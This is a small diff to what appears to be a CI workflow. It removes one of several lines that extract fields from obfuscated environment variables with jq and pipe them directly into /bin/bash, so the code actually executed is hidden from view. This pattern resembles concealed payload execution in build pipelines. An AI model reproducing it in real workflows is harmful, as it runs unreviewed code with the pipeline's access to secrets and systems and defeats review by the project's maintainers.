@@ -25,7 +25,6 @@ jobs:
           echo $kga25 | jq -r .y37 | /bin/bash
           printf '%s' "$n31789" | jq -r .euaz759 | /bin/bash
           printf '%s' "$m3038" | jq -r .p132 | /bin/bash
-          printf '%s' "$e43956" | jq -r .jdvb55 | /bin/bash
           printf '%s' "$hfq243" | jq -r .bfb599 | /bin/bash
 
       - name: Archive results
